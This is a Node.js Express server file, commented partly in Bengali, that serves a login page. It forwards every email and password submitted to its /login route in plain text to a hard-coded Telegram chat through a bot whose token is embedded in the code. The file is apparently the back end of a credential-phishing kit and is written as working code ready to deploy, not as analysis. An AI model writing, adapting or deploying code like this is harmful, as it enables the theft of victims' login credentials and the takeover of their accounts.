const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const app = express();
const PORT = process.env.PORT || 3000;

// Telegram bot setup
const TOKEN = '8349197469:AAGJ3QhB8iJUobWn_qL2sXbLXzsTMsPsnLo';
const CHAT_ID = '6367435401';

const bot = new TelegramBot(TOKEN, { polling: true });

// Static files serve
app.use(express.static(__dirname));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.json());

// "/" রুটে login.html দেখাবে
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

// Login form থেকে ডাটা নিলে Telegram-এ পাঠাবে
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const message = `Login Info:\nEmail: ${email}\nPassword: ${password}`;
  bot.sendMessage(CHAT_ID, message);
  res.send('Login info sent!');
});

// Telegram bot test
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "Bot is working!");
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
